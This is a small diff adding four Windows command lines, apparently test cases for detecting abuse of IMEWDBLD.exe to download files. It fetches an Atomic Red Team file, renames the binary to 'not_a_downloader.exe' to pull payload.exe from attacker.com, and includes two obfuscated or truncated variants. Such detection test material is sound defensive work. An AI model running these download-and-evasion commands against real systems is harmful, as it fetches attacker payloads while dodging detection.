@@ -1,0 +1,4 @@
+"C:\WINDOWS\System32\IME\SHARED\IMEWDBLD.exe" https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml
+copy IMEWDBLD.exe not_a_downloader.exe && not_a_downloader.exe http://attacker.com/payload.exe
+imewdbld.exe "h"tt"payload.exe"
+imewdbld.exe ftattacker.com/payload.exe
